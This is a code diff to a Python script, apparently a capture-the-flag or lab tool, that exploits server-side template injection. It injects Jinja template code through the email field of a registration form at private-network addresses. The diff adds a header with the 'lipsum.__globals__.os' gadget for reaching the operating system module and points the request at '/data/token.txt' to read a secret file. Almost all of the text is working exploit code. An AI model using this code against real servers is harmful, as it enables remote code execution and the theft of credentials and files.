@@ -15,14 +15,17 @@ class SSTI():
 	def register(self, code, pw='a'):
 		if self.set:
 			user = '{%' + quote_plus(code) + '%}@b.co'
-		user = '{{' + quote_plus(code) + '}}@b.co'
+		else:
+			user = '{{' + quote_plus(code) + '}}@b.co'
 		if self.debug:
 			print(user)
 
 		pw = quote_plus(pw)
 		headers = {
 			'Accept-Encoding': 'gzip, deflate',
-			'Content-Type': 'application/x-www-form-urlencoded'
+			'Content-Type': 'application/x-www-form-urlencoded',
+			'session': 'lipsum.__globals__.os'
+
 		}
 		data = {
 			'email': user,
@@ -37,6 +40,8 @@ class SSTI():
 		r = requests.post(self.url, headers=headers, data=data)
 		if r.status_code != 200:
 			return r.status_code, r.reason
+		if self.debug > 1:
+			print(r.headers)
 
 		soup = BeautifulSoup(r.text, features='lxml')
 
@@ -65,6 +70,6 @@ def get_args():
 
 if __name__ == '__main__':
 	args = get_args()
-	temp = SSTI('http://10.102.2.251/user/register', debug=args.v,
+	temp = SSTI('http://10.102.1.119/user/register?o=/data/token.txt', debug=args.v,
 				setvar=args.set)
 	print(temp.register(args.code))
